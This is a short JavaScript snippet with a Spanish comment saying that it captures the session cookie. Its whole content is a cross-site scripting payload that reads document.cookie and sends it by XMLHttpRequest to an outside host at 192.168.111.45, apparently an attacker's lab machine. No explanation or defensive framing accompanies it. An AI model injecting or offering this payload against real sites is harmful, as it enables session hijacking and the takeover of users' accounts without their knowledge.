//Este script capta la cookie de sesión

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.111.45/?cookie=' + document.cookie);
request.send();
```
